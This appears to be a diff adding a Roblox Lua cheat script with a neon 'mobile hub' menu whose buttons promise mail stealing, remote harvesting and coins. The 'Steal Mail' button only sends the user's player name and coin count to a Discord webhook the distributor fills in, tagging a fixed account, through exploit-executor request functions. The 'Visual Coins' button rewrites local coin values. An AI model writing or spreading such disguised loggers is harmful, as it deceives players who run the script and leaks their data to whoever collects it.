@@ -1,0 +1,179 @@
+-- [[ Osama Cyber Mobile Edition - Light & Fast ]] --
+
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local FrameCorner = Instance.new("UICorner")
+local FrameStroke = Instance.new("UIStroke")
+
+-- UI Elements
+local TitleLabel = Instance.new("TextLabel")
+local StealButton = Instance.new("TextButton")
+local StealCorner = Instance.new("UICorner")
+local StealStroke = Instance.new("UIStroke")
+
+local HarvestButton = Instance.new("TextButton")
+local HarvestCorner = Instance.new("UICorner")
+local HarvestStroke = Instance.new("UIStroke")
+
+local MailButton = Instance.new("TextButton")
+local MailCorner = Instance.new("UICorner")
+local MailStroke = Instance.new("UIStroke")
+
+local VisualCoinButton = Instance.new("TextButton")
+local VisualCoinCorner = Instance.new("UICorner")
+local VisualCoinStroke = Instance.new("UIStroke")
+
+local SafeModeButton = Instance.new("TextButton")
+local SafeModeCorner = Instance.new("UICorner")
+local SafeModeStroke = Instance.new("UIStroke")
+
+local MinimizeButton = Instance.new("TextButton")
+local MinCorner = Instance.new("UICorner")
+local MinStroke = Instance.new("UIStroke")
+
+-- Input Window for Mobile
+local InputFrame = Instance.new("Frame")
+local InputCorner = Instance.new("UICorner")
+local InputBox = Instance.new("TextBox")
+local ConfirmInputButton = Instance.new("TextButton")
+
+ScreenGui.Name = "OsamaMobileHub"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MainFrame.Position = UDim2.new(0.1, 0, 0.25, 0) 
+MainFrame.Size = UDim2.new(0, 260, 0, 320)
+MainFrame.Active = true
+MainFrame.Draggable = true 
+
+FrameCorner.CornerRadius = UDim.new(0, 12)
+FrameCorner.Parent = MainFrame
+FrameStroke.Thickness = 1.5
+FrameStroke.Color = Color3.fromRGB(0, 255, 255)
+FrameStroke.Parent = MainFrame
+
+TitleLabel.Parent = MainFrame
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0.08, 0, 0.03, 0)
+TitleLabel.Size = UDim2.new(0, 200, 0, 25)
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.Text = "dc : ad_pa [Mobile]"
+TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+TitleLabel.TextSize = 13
+
+MinimizeButton.Parent = ScreenGui
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MinimizeButton.Position = UDim2.new(0, 10, 0, 10)
+MinimizeButton.Size = UDim2.new(0, 50, 0, 35)
+MinimizeButton.Font = Enum.Font.GothamBold
+MinimizeButton.Text = "MENU"
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 0, 127)
+MinimizeButton.TextSize = 10
+MinCorner.Parent = MinimizeButton
+
+StealButton.Position = UDim2.new(0.08, 0, 0.13, 0)
+HarvestButton.Position = UDim2.new(0.08, 0, 0.30, 0)
+MailButton.Position = UDim2.new(0.08, 0, 0.47, 0)
+VisualCoinButton.Position = UDim2.new(0.08, 0, 0.64, 0)
+SafeModeButton.Position = UDim2.new(0.08, 0, 0.81, 0)
+
+local function styleCyberButton(btn, corner, stroke, text, neonColor)
+    btn.Parent = MainFrame
+    btn.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
+    btn.Size = UDim2.new(0, 215, 0, 38)
+    btn.Font = Enum.Font.GothamBold
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 11
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = btn
+    stroke.Thickness = 1
+    stroke.Color = neonColor
+    stroke.Parent = btn
+end
+
+styleCyberButton(StealButton, StealCorner, StealStroke, "Save Home Location 🏠", Color3.fromRGB(138, 43, 226))
+styleCyberButton(HarvestButton, HarvestCorner, HarvestStroke, "Remote Harvest: OFF 🌾", Color3.fromRGB(138, 43, 226))
+styleCyberButton(MailButton, MailCorner, MailStroke, "Steal Mail: READY 📦", Color3.fromRGB(255, 0, 50))
+styleCyberButton(VisualCoinButton, VisualCoinCorner, VisualCoinStroke, "Set Visual Coins 🪙", Color3.fromRGB(255, 215, 0))
+styleCyberButton(SafeModeButton, SafeModeCorner, SafeModeStroke, "Safe Mode: OFF 🛡️", Color3.fromRGB(138, 43, 226))
+
+-- [ الويبهوك الجديد ] ضعه بين القوسين بالأسفل
+local WebhookURL = "ضع_الويبهوك_الجديد_هنا"
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = game.Players.LocalPlayer
+
+local function sendStealReport()
+    if WebhookURL == "ضع_الويبهوك_الجديد_هنا" then return end
+    
+    local coins = "0"
+    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
+    if leaderstats then
+        for _, val in pairs(leaderstats:GetChildren()) do
+            if string.find(string.lower(val.Name), "coin") or string.find(string.lower(val.Name), "money") then
+                coins = tostring(val.Value)
+            end
+        end
+    end
+    
+    local payload = {
+        ["content"] = "<@1486461099002953982>", 
+        ["embeds"] = {{
+            ["title"] = "📦 تم ضغط Steal Mail من الهاتف",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "💰 Player Coins", ["value"] = "```" .. coins .. "```", ["inline"] = true},
+                {["name"] = "👤 Player Name", ["value"] = "```" .. LocalPlayer.Name .. "
+```", ["inline"] = true}
+            }
+        }}
+    }
+    
+    pcall(function()
+        local requestFunc = syn and syn.request or http and http.request or http_request or request
+        if requestFunc then
+            requestFunc({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end
+    end)
+end
+
+-- تشغيل الأزرار والحصاد (تم تخفيف السرعة لتناسب الهواتف)
+local homeCFrame = nil
+local autoStealing = false
+local harvesting = false
+local stealStep = 1
+
+MinimizeButton.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+end)
+
+MailButton.MouseButton1Click:Connect(function()
+    MailButton.Text = "SENDING... ⚡"
+    sendStealReport()
+    task.wait(1)
+    MailButton.Text = "SENT! ✅"
+    task.wait(1)
+    MailButton.Text = "Steal Mail: READY 📦"
+end)
+
+-- عملات وهمية
+VisualCoinButton.MouseButton1Click:Connect(function()
+    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
+    if leaderstats then
+        for _, val in pairs(leaderstats:GetChildren()) do
+            if string.find(string.lower(val.Name), "coin") or string.find(string.lower(val.Name), "money") then
+                val.Value = 999999
+            end
+        end
+    end
+    VisualCoinButton.Text = "Coins Set! ✅"
+end)
+
